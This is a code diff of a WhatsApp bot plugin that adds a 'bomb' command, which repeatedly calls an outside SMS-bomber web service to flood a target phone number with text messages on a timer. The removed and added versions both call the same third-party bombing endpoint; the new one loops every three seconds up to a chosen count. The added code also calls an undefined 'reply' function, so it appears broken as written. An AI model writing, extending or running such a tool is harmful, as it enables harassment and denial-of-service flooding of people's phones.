@@ -1,47 +1,42 @@
 const { cmd } = require('../command');
-
-// Hardcoded API (Aap yahin apna API daal do)
-const SMS_API = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";
+let isBombing = false;
+let bombingInterval;
 
 cmd({
     pattern: "bomb",
     react: "💣",
-    desc: "Trigger SMS bombing (Owner Only)",
+    desc: "Start/Stop SMS bombing",
     category: "main",
     filename: __filename
-}, 
-async (conn, mek, m, { from, isOwner }) => {
-    try {
-        if (!isOwner) {
-            return conn.sendMessage(from, { text: "❌ Only bot owner can use this command!" }, { quoted: mek });
-        }
+}, async (conn, mek, m, { from, isOwner, text }) => {
+    if (!isOwner) return reply("❌ Owner only!");
 
-        // Extract number (command/reply/mention se)
-        const number = m.quoted?.sender || m.mentionedJid?.[0] || m.text.split(' ')[1];
-        if (!number) {
-            return conn.sendMessage(from, { text: "Usage: !bomb 923001234567" }, { quoted: mek });
-        }
+    const args = text.split(' ');
+    const number = args[1]?.replace('@s.whatsapp.net', '');
 
-        // Clean number (remove WhatsApp suffix if any)
-        const cleanNumber = number.replace('@s.whatsapp.net', '');
-
-        // Call API
-        const apiUrl = `${SMS_API}${cleanNumber}`;
-        const response = await fetch(apiUrl);
-
-        if (response.ok) {
-            conn.sendMessage(from, { 
-                text: `✅ SMS bombing started on *${cleanNumber}*!\n\n_Note: Use responsibly!_` 
-            }, { quoted: mek });
-        } else {
-            conn.sendMessage(from, { 
-                text: `❌ API failed! Status: ${response.status}` 
-            }, { quoted: mek });
-        }
-    } catch (error) {
-        console.error(error);
-        conn.sendMessage(from, { 
-            text: `⚠️ Error: ${error.message}` 
-        }, { quoted: mek });
+    // STOP Logic
+    if (isBombing) {
+        clearInterval(bombingInterval);
+        isBombing = false;
+        return reply("✅ Bombing stopped!");
     }
+
+    // START Logic
+    if (!number) return reply("Usage: !bomb 92300 [count=10]");
+    const count = args[2] || 10; // Default: 10 SMS
+
+    isBombing = true;
+    let sent = 0;
+    reply(`💣 Bombing STARTED on ${number} (${count} SMS)`);
+
+    bombingInterval = setInterval(async () => {
+        if (!isBombing || sent >= count) {
+            clearInterval(bombingInterval);
+            isBombing = false;
+            return;
+        }
+        
+        await fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`);
+        sent++;
+    }, 3000); // 3-second delay
 });
